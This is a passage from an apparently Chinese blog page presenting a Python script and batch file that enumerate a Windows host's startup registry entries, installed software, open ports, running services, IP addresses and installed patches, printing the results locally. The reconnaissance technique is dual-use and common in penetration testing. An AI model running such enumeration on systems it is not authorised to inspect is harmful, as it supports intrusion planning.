class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># print(&quot;Name: &#123;&#125;&quot;.format(name))</span></span><br><span class="line">            <span class="comment"># print(&quot;Path: &#123;&#125;&quot;.format(value))</span></span><br><span class="line">            <span class="comment"># print(&quot;-&quot;*50)</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="comment"># print(&quot;&#123;&#125; is empty.\n&quot;.format(title))</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_registry_subkeys</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            subkeys_count, _, _ = winreg.QueryInfoKey(key)</span><br><span class="line">            subkeys = [winreg.EnumKey(key, i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(subkeys_count)]</span><br><span class="line">            <span class="keyword">return</span> subkeys</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_registry_value</span>(<span class="params">hive, subkey, value_name</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> winreg.OpenKey(hive, subkey) <span class="keyword">as</span> key:</span><br><span class="line">            value, _ = winreg.QueryValueEx(key, value_name)</span><br><span class="line">            <span class="keyword">return</span> value</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getInstallAppInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机已安装应用信息......&quot;</span>)</span><br><span class="line">    <span class="comment"># 列出 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall 下的子项及其 DisplayName 值</span></span><br><span class="line">    hive1 = winreg.HKEY_LOCAL_MACHINE</span><br><span class="line">    subkey = <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall&quot;</span></span><br><span class="line">    subkeys1 = list_registry_subkeys(hive1, subkey)</span><br><span class="line"></span><br><span class="line">    hive2 = winreg.HKEY_CURRENT_USER</span><br><span class="line">    subkeys2 = list_registry_subkeys(hive2, subkey)</span><br><span class="line">    <span class="keyword">if</span> subkeys1:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKLM:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 打印结果</span></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys1:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive1, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># print(&quot;-&quot; * 50)</span></span><br><span class="line">    <span class="keyword">if</span> subkeys2:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] HKCU:&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> subkey_name <span class="keyword">in</span> subkeys2:</span><br><span class="line">        subkey_path = <span class="string">r&quot;&#123;&#125;\&#123;&#125;&quot;</span>.<span class="built_in">format</span>(subkey, subkey_name)</span><br><span class="line">        display_name = get_registry_value(hive2, subkey_path, <span class="string">&quot;DisplayName&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> display_name:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;&#123;&#125;&quot;</span>.<span class="built_in">format</span>(display_name))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getAutoRunInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机启动项信息......&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_run, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_current_user_runonce, <span class="string">&quot;HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_run, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;</span>)</span><br><span class="line">    print_startup_items(startup_items_local_machine_runonce, <span class="string">&quot;HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getPortInfo</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] 获取主机开放端口服务信息......&quot;</span>)</span><br><span class="line">    services_found = []  <span class="comment"># 保存识别出的端口服务信息</span></span><br><span class="line">    services_unfound = []</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        result = subprocess.Popen([<span class="string">&quot;netstat&quot;</span>, <span class="string">&quot;-ano&quot;</span>], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># print(netstat_output)</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># 使用正则表达式匹配并提取信息</span></span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines():</span><br><span class="line">            <span class="keyword">match</span> = re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">match</span>:</span><br><span class="line">                local_address, _, state, pid = <span class="keyword">match</span>.groups()</span><br><span class="line"></span><br><span class="line">                <span class="comment"># 只输出 LISTENING 状态的信息，并且只显示本地地址、状态和 PID</span></span><br><span class="line">                <span class="keyword">if</span> state <span class="keyword">in</span> [<span class="string">&quot;LISTENING&quot;</span>, <span class="string">&quot;ESTABLISHED&quot;</span>]:</span><br><span class="line">                    <span class="comment"># 从 local_address 中提取 IP 地址和端口</span></span><br><span class="line">                    ip_port_match = re.<span class="keyword">match</span>(<span class="string">r&#x27;(\S+):(\d+)&#x27;</span>, local_address)</span><br><span class="line">                    <span class="keyword">if</span> ip_port_match:</span><br><span class="line">                        ip, port = ip_port_match.groups()</span><br><span class="line">                        <span class="comment"># 尝试从字典中获取服务信息，如果没有找到则输出 &quot;Unknown Service&quot;</span></span><br><span class="line">                        service = service_port_mapping.get(<span class="built_in">int</span>(port), <span class="string">&quot;Unknown Service&quot;</span>)</span><br><span class="line">                        <span class="comment"># 输出 IP地址、端口、状态和 PID、服务</span></span><br><span class="line">                        <span class="keyword">if</span> service != <span class="string">&quot;Unknown Service&quot;</span>:</span><br><span class="line">                            services_found.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line">                        <span class="keyword">else</span>:</span><br><span class="line">                            services_unfound.append(&#123;<span class="string">&quot;port&quot;</span>: port, <span class="string">&quot;service&quot;</span>: service&#125;)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 本地连接IP 端口去重  并用port进行排序</span></span><br><span class="line">        services_found = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_found&#125;]</span><br><span class="line">        services_found = <span class="built_in">sorted</span>(services_found, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        services_unfound = [<span class="built_in">dict</span>(t) <span class="keyword">for</span> t <span class="keyword">in</span> &#123;<span class="built_in">tuple</span>(d.items()) <span class="keyword">for</span> d <span class="keyword">in</span> services_unfound&#125;]</span><br><span class="line">        services_unfound = <span class="built_in">sorted</span>(services_unfound, key=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x[<span class="string">&#x27;port&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个已知端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_found)))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 共匹配到 &#123;&#125; 个未知端口服务&quot;</span>.<span class="built_in">format</span>(<span class="built_in">len</span>(services_unfound)))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 识别出的端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_found:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_found:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] 未识别出的端口服务:&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> services_unfound:</span><br><span class="line">            <span class="keyword">for</span> service_info <span class="keyword">in</span> services_unfound:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;  &#123;&#125;\t\t&#123;&#125;&quot;</span>.<span class="built_in">format</span>(service_info[<span class="string">&#x27;port&#x27;</span>], service_info[<span class="string">&#x27;service&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">        <span class="comment"># 如果未找到相关信息，则输出一条消息</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">any</span>(re.<span class="keyword">match</span>(<span class="string">r&#x27;\s*TCP\s+(\S+)\s+(\S+)\s+(\S+)\s+(\d+)&#x27;</span>, line) <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines()):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[-] 未找到相关信息!&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getServiceInfo</span>():</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[+] 获取主机正在运行的服务......&#x27;</span>)</span><br><span class="line">        result = subprocess.Popen(<span class="string">&#x27;net start | find /v &quot;已经启动以下 Windows 服务&quot; | find /v &quot;命令成功完成&quot;&#x27;</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">        out, err = result.communicate()</span><br><span class="line">        netstat_output = out.decode(<span class="string">&#x27;gbk&#x27;</span>)</span><br><span class="line">        <span class="comment"># 去空行</span></span><br><span class="line">        netstat_output = <span class="string">&quot;\n&quot;</span>.join(line <span class="keyword">for</span> line <span class="keyword">in</span> netstat_output.splitlines() <span class="keyword">if</span> line.strip())</span><br><span class="line">        <span class="built_in">print</span>(netstat_output)</span><br><span class="line">    <span class="keyword">except</span> subprocess.CalledProcessError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] 错误: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(e))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;=&quot;</span> * <span class="number">50</span>)</span><br><span class="line"></span><br><span class="line">bat_file_path = <span class="string">r&#x27;getosinfo1.bat&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getSystemInfo</span>():</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 正常 可在 win2003 cmd下 运行   cmd /c 1.bat 获取相关信息</span></span><br><span class="line">    <span class="comment"># 但是在这运行不了 是因为 bat脚本为utf-8编码 需要改成ANSI</span></span><br><span class="line">    <span class="comment"># print(&quot;[+] 准备运行bat脚本获取系统信息...&quot;)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 这样解决了 输出结果的中文乱码问题 但是在命令行操作时 通过findstr 去筛选中文 编码改变后将会找不到</span></span><br><span class="line">    <span class="comment"># subprocess.call([&quot;chcp&quot;, &quot;65001&quot;], shell=True)</span></span><br><span class="line">    <span class="comment"># result = subprocess.call([bat_file_path], shell=True)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 调用bat脚本并获取输出</span></span><br><span class="line">    process = subprocess.Popen([bat_file_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=<span class="literal">True</span>)</span><br><span class="line">    output, error = process.communicate()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 输出脚本执行结果</span></span><br><span class="line">    <span class="built_in">print</span>(output.decode(<span class="string">&#x27;cp936&#x27;</span>))</span><br><span class="line">    <span class="comment"># print(&quot;[+] 运行结束...&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getScheduleTaskInfo</span>():</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getOSRelease</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 检测到当前主机系统为&#x27;</span>,platform.system() +<span class="string">&quot; &quot;</span>+platform.release())</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] 开始对本机进行信息收集,请稍等片刻......&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    getOSRelease()</span><br><span class="line">    <span class="comment"># 系统信息  通过掉bat脚本获取信息  补丁详情处有点问题!</span></span><br><span class="line">    getSystemInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment">#自启动项 端口 安装应用 运行服务</span></span><br><span class="line">    getAutoRunInfo()</span><br><span class="line">    getPortInfo()</span><br><span class="line">    getInstallAppInfo()</span><br><span class="line">    getServiceInfo()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 普通用户没权限 这个可以考虑忽略掉</span></span><br><span class="line">    <span class="comment"># getScheduleTaskInfo()</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>getosinfo1.bat</p>
<figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 系统信息:</span><br><span class="line">systeminfo | <span class="built_in">findstr</span> /i /c:&quot;主机名&quot; /c:&quot;OS 名称&quot; /c:&quot;OS 版本&quot; | <span class="built_in">find</span> /v &quot;BIOS 版本&quot;</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] IPv4地址:</span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=<span class="number">2</span> delims=:&quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">ipconfig</span> ^| <span class="built_in">findstr</span> /i &quot;IPv4 地址 IP Address&quot; ^| <span class="built_in">findstr</span> /i /v &quot;IPv6&quot;&#x27;) <span class="keyword">do</span> (</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">%%a</span></span><br><span class="line">)</span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> [+] 列出已安装的修复补丁:</span><br><span class="line"><span class="built_in">setlocal</span> enabledelayedexpansion</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 运行 systeminfo 命令并将结果保存到临时文件</span></span><br><span class="line">systeminfo &gt; systeminfo_output.txt</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 遍历文件内容</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> /f &quot;tokens=* delims= &quot; <span class="variable">%%a</span> <span class="keyword">in</span> (&#x27;<span class="built_in">type</span> systeminfo_output.txt&#x27;) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">%%a</span> | <span class="built_in">findstr</span> /r /C:&quot;\[[<span class="number">0</span>-<span class="number">9</span>]*\]\:\ KB[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]&quot;</span><br><span class="line">  <span class="built_in">echo</span> <span class="variable">%%a</span> | <span class="built_in">findstr</span> /r /C:&quot;\[[<span class="number">0</span>-<span class="number">9</span>]*\]\:\ Q[<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>][<span class="number">0</span>-<span class="number">9</span>]&quot;</span><br><span class="line">)</span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">REM 删除临时文件</span></span><br><span class="line"><span class="built_in">del</span> systeminfo_output.txt</span><br><span class="line"></span><br><span class="line"><span class="built_in">endlocal</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<hr>
<h3 id="Version3"><a href="#Version3" class="headerlink" title="Version3"></a>Version3</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> winreg</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">service_port_mapping = &#123;</span><br><span class="line">    <span class="number">21</span>: <span class="string">&quot;FTP/TFTP/VSFTPD (File Transfer Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">22</span>: <span class="string">&quot;SSH (Secure Shell)&quot;</span>,</span><br><span class="line">    <span class="number">23</span>: <span class="string">&quot;Telnet (Remote Connection)&quot;</span>,</span><br><span class="line">    <span class="number">25</span>: <span class="string">&quot;SMTP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">53</span>: <span class="string">&quot;DNS (Domain Name System)&quot;</span>,</span><br><span class="line">    <span class="number">67</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">68</span>: <span class="string">&quot;DHCP (Dynamic Host Configuration Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">110</span>: <span class="string">&quot;POP3 (Email)&quot;</span>,</span><br><span class="line">    <span class="number">123</span>: <span class="string">&quot;NTP&quot;</span>,</span><br><span class="line">    <span class="number">135</span>: <span class="string">&quot;RPC（Remote Procedure Call)&quot;</span>,</span><br><span class="line">    <span class="number">137</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">139</span>: <span class="string">&quot;Samba (File Sharing)&quot;</span>,</span><br><span class="line">    <span class="number">143</span>: <span class="string">&quot;IMAP (Email)&quot;</span>,</span><br><span class="line">    <span class="number">161</span>: <span class="string">&quot;SNMP (Simple Network Management Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">389</span>: <span class="string">&quot;LDAP (Lightweight Directory Access Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">445</span>: <span class="string">&quot;SMB (Server Message Block)&quot;</span>,</span><br><span class="line">    <span class="number">512</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">513</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">514</span>: <span class="string">&quot;Linux Rexec (Remote Execution Service)&quot;</span>,</span><br><span class="line">    <span class="number">873</span>: <span class="string">&quot;Rsync (Remote File Synchronization)&quot;</span>,</span><br><span class="line">    <span class="number">1080</span>: <span class="string">&quot;Socket&quot;</span>,</span><br><span class="line">    <span class="number">1098</span>: <span class="string">&quot;JAVARMI&quot;</span>,</span><br><span class="line">    <span class="number">1352</span>: <span class="string">&quot;Lotus Domino (Email)&quot;</span>,</span><br><span class="line">    <span class="number">1433</span>: <span class="string">&quot;MSSQL (Microsoft SQL Server)&quot;</span>,</span><br><span class="line">    <span class="number">1521</span>: <span class="string">&quot;Oracle Database&quot;</span>,</span><br><span class="line">    <span class="number">2049</span>: <span class="string">&quot;NFS (Network File System)&quot;</span>,</span><br><span class="line">    <span class="number">2181</span>: <span class="string">&quot;Zookeeper&quot;</span>,</span><br><span class="line">    <span class="number">2222</span>: <span class="string">&quot;DA&quot;</span>,</span><br><span class="line">    <span class="number">2375</span>: <span class="string">&quot;Docker Remote API&quot;</span>,</span><br><span class="line">    <span class="number">2601</span>: <span class="string">&quot;zebra&quot;</span>,</span><br><span class="line">    <span class="number">3306</span>: <span class="string">&quot;MySQL Database&quot;</span>,</span><br><span class="line">    <span class="number">3128</span>: <span class="string">&quot;squid&quot;</span>,</span><br><span class="line">    <span class="number">3389</span>: <span class="string">&quot;RDP (Remote Desktop Protocol)&quot;</span>,</span><br><span class="line">    <span class="number">4100</span>: <span class="string">&quot;SysBase&quot;</span>,</span><br><span class="line">    <span class="number">4440</span>: <span class="string">&quot;rundeck&quot;</span>,</span><br><span class="line">    <span class="number">4848</span>: <span class="string">&quot;GlassFish Console&quot;</span>,</span><br><span class="line">    <span class="number">5000</span>: <span class="string">&quot;Sybase/DB2 Database&quot;</span>,</span><br><span class="line">    <span class="number">5422</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5432</span>: <span class="string">&quot;PostgreSQL Database&quot;</span>,</span><br><span class="line">    <span class="number">5632</span>: <span class="string">&quot;PCAnywhere Service&quot;</span>,</span><br><span class="line">    <span class="number">5900</span>: <span class="string">&quot;VNC (Virtual Network Computing)&quot;</span>,</span><br><span class="line">    <span class="number">5984</span>: <span class="string">&quot;CouchDB&quot;</span>,</span><br><span class="line">    <span class="number">6082</span>: <span class="string">&quot;Varnish&quot;</span>,</span><br><span class="line">    <span class="number">6379</span>: <span class="string">&quot;Redis Database&quot;</span>,</span><br><span class="line">    <span class="number">7001</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">7002</span>: <span class="string">&quot;WebLogic&quot;</span>,</span><br><span class="line">    <span class="number">80</span>: <span class="string">&quot;HTTP&quot;</span>,</span><br><span class="line">    <span class="number">443</span>: <span class="string">&quot;HTTPS&quot;</span>,</span><br><span class="line">    <span class="number">8000</span>: <span class="string">&quot;Jdwp&quot;</span>,</span><br><span class="line">    <span class="number">8069</span>: <span class="string">&quot;Zabbix&quot;</span>,</span><br><span class="line">    <span class="number">8161</span>: <span class="string">&quot;ActiveMQ&quot;</span>,</span><br><span class="line">    <span class="number">8080</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8089</span>: <span class="string">&quot;Jboss/Tomcat/Resin/GlassFish/Jenkins/Jetty&quot;</span>,</span><br><span class="line">    <span class="number">8083</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8086</span>: <span class="string">&quot;InfluxDB&quot;</span>,</span><br><span class="line">    <span class="number">8980</span>: <span class="string">&quot;OpenNMS&quot;</span>,</span><br><span class="line">    <span class="number">9000</span>: <span class="string">&quot;FastCGI&quot;</span>,</span><br><span class="line">    <span class="number">9080</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9090</span>: <span class="string">&quot;Websphere Console&quot;</span>,</span><br><span class="line">    <span class="number">9200</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">9300</span>: <span class="string">&quot;Elasticsearch&quot;</span>,</span><br><span class="line">    <span class="number">11211</span>: <span class="string">&quot;Memcached&quot;</span>,</span><br><span class="line">    <span class="number">27017</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">27018</span>: <span class="string">&quot;MongoDB&quot;</span>,</span><br><span class="line">    <span class="number">50000</span>: <span class="string">&quot;SAP&quot;</span>,</span><br><span class="line">    <span class="number">50010</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50030</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line">    <span class="number">50070</span>: <span class="string">&quot;Hadoop&quot;</span>,</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_startup_items</span>(<span class="params">hive, subkey</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        key = winreg.OpenKey(hive, subkey, <span class="number">0</span>, winreg.KEY_READ)</span><br><span class="line"></span><br><span class="line">        startup_items = &#123;&#125;</span><br><span class="line">        index = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                name, value, _ = winreg.EnumValue(key, index)</span><br><span class="line">                startup_items[name] = value</span><br><span class="line">                index += <span class="number">1</span></span><br><span class="line">            <span class="keyword">except</span> OSError:</span><br><span class="line">                <span class="comment"># 到达注册表末尾</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> startup_items</span><br><span class="line"></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># print(&quot;[-] Error: &#123;&#125;&quot;.format(e))</span></span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_current_user_run = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_current_user_runonce = get_startup_items(winreg.HKEY_CURRENT_USER, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span></span><br><span class="line">startup_items_local_machine_run = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\Run&quot;</span>)</span><br><span class="line"><span class="comment"># 读取 HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce</span></span><br><span class="line">startup_items_local_machine_runonce = get_startup_items(winreg.HKEY_LOCAL_MACHINE, <span class="string">r&quot;SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">print_startup_items</span>(<span class="params">startup_items, title</span>):</span><br><span class="line">    <span class="keyword">if</span> startup_items:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] &#123;&#125;: &quot;</span>.<span class="built_in">format</span>(title))</span><br><span class="line">        <span class="keyword">for</span> name, value <span class="keyword">in</span> startup_items.items():</span><br><span class="line">            <span class="built_in">print</span>(name)</span><br><span class="line">            <span class="comment"># 